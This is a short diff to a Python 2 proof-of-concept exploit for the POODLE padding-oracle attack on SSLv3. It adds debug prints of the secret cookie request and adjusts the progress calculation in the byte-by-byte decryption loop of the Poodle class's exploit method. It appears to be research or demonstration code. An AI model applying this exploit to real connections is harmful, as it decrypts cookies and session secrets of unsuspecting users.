@@ -67,6 +67,8 @@ class Client:
         self.proxy_host = host
         self.proxy_port = port
         self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(8))
+        print "Sending request : "
+        print "GET / HTTP/1.1\r\nCookie: " + self.cookie + "\r\n\r\n"
 
     def connection(self):
         # Initialization of the client
@@ -212,12 +214,13 @@ class Poodle(Client):
 
     def exploit(self):
         # start at block 2, finish at block n-1
+        length_f = self.length_frame
         for i in range(1,(self.length_frame/self.length_block) - 1):
             self.current_block = i
             for j in reversed(range(self.length_block)):
                 byte_found = self.find_plaintext_byte(self.frame,j)
                 self.request += re.sub('[\r\n]', ' ', byte_found)
-                percent = 100.0 * self.byte_decipher / (self.length_frame - 2 * self.length_block)
+                percent = 100.0 * self.byte_decipher / (length_f - 2 * self.length_block)
                 sys.stdout.write("\rProgression %.0f%% - %s" % (percent, self.request))
                 sys.stdout.flush()
         return
